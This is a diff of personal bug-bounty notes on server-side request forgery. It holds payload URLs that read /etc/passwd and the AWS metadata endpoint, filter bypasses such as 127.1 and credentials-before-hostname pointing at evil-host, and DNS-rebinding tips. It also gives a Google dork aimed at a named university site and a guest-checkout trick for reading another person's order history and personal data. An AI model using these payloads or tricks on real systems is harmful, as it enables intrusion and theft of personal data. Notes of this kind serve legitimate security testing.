@@ -1,5 +1,4 @@
 
-
     SSRF
     map the application
         identify any request parameter that contains hostnames, ip addresses or full url
@@ -32,6 +31,14 @@
        site:https://somaiya.edu.in ext:php inurl:download.php
         https://example.com/viewimage/?url=file:///etc/passwd  ///
         https://example.com/viewimage/?url=http://169.254.169.254/latest/meta-data     // this is redirtling the file to aws/metadata
+        
+        
+        HOW TO CATCH A BLIND SSRF
+   1)    In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.
+   
+   2)    
+       
+       
        
        TIP 1
        
@@ -106,6 +113,15 @@ https://192.10.10.2#.192.10.10.3/
 https://192.10.10.2?.192.10.10.3/
 https://192.10.10.2\.192.10.10.3/
 https://192.10.10.3/
+
+You can embed credentials in a URL before the hostname:
+https://expected-host:fakepassword@evil-host
+https://evil-host#expected-host                 using the #character  and also check if  You can also try double-encoding characters and try the combination of all this techiniques
+
+
+
+
+
 https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
 <?php
 header('Location: http://127.0.0.1:8080/status');
@@ -204,3 +220,79 @@ header('Location: http://127.0.0.1:8080/status');
  subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 
  
    regex for ssrf in autorepeter =  https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)
+   
+   
+   
+   
+   
+   These are the top 5 obvious features I look for in a target app to find SSRF Issues:
+
+1️⃣ Export to PDF - Does your target app support generating PDFs? 📄 Try injecting HTML into the content that is used for generating that PDF. If vulnerable to HTML injection, you might strike gold by injecting HTML/JS.💰
+
+2️⃣ Integrations - If your target app supports web hook Integration feature, replace the URL with your Burp Collab and wait for a hit. 🔄
+
+3️⃣ Import via link Feature - Does your target app support importing files or websites via a link? 📥 Specify your attacker Burp Collab and check for a hit, especially when uploading profile pictures or media through a library.
+
+4️⃣ Host Header - Test for Routing-based SSRF by supplying your Collaborator server domain in the Host header. If you receive a DNS lookup from the target server, you might be able to route requests to arbitrary domains🌐
+
+5️⃣ File Upload - Does your target app support uploading files? 📂 Try uploading an HTML file; if rendered and executed on the server-side, you might strike gold. No luck? Try an SVG with SSRF payload. If that fails, move on to the next!
+   
+   
+  
+   
+   
+   //////
+    never forgot to look into JavaScript files, as it is possible to get new endpoints from them.
+   
+   
+   
+   
+   SSRF IN DNS REBRINDING
+  set dns rebrinding to   127.0.0.1/google ip  or any other bypass and send many request with burp intruder and watch response that come back different lenght than others
+  check if it is an aws metadata IP and try to  retrieve data from there by firing up burp intruder
+  
+
+
+   
+   TIPS 3
+I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒. 
+
+Many overlook these issues because they require placing an order 📦. However, some services support cash on delivery 💸 or allow you to place a cheap order and then cancel it for a refund 🔄, making it worth adding to your checklist if other prerequisites are met.
+
+Here's what to look for:
+
+1️⃣ Target app that permits guest orders without creating an account 🕵️‍♂️
+2️⃣ Target app doesn't require email verification for new account creation, or you've found an email verification bypass on sign-up 📧🔓
+
+If these prerequisites are met, you can often find target apps with a misconfiguration that lets you access a guest user's order history by creating a new account with the same email used for the guest order. 
+
+Here's how it usually goes down:
+
+1️⃣ Place an order on the site as a "Guest" and use the victim's email during checkout, e.g., victim@example.com 📩 
+2️⃣ The victim receives an email with the receipt 📧
+3️⃣ As an attacker, sign up using the email victim@example.com assuming there's no email verification 🧑‍💻
+4️⃣ Navigate to the account's order history page, and you might strike gold 🪙 by finding the previously made orders, leading to Order History and PII leaks 🔍📜
+
+Takeaways: Don't ignore workflows involving payments; you might discover workarounds like cheap payments or cash on delivery 💡💳. Test for unusual flows and be ready for pleasant surprises with some lucrative bounties 
+   
+   
+   tips 
+   
+
+   Bypass #SSRF filters by using http://127.1 instead of http://127.0.0.1
+  It resolves to the same but confuses filters blocking localhost/127.0.0.1 specifically!  and also remember that 
+      file:///etc/passwd : Not authorized
+      file://\/\/etc/passwd : Work 😀
+      
+      tips
+      using wordlistgen
+      go get -u github.com/ethicalplayground/wordlistgen
+      
+      cat "https://example.com" | getjs -complete | ./wordlistgen -p param.txt -d"www.example.com" | tee wordlist.txt
+      
+      //replace variables with payload and always change payload with ssrf payload
+      
+      cat wordlist.txt | qsreplace http://127.0.0.1/admin | tee -a host.txt 
+      
+      use httpx to keep track of the code
+      cat hosttxt | httpx -title -status-code
